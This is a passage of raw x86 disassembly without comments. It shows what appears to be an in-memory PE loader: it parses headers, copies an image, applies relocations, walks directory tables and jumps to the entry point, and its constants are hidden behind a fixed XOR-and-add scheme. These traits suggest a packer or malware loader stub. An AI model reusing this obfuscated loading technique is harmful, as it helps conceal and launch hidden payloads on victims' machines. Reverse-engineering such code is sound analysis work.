  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
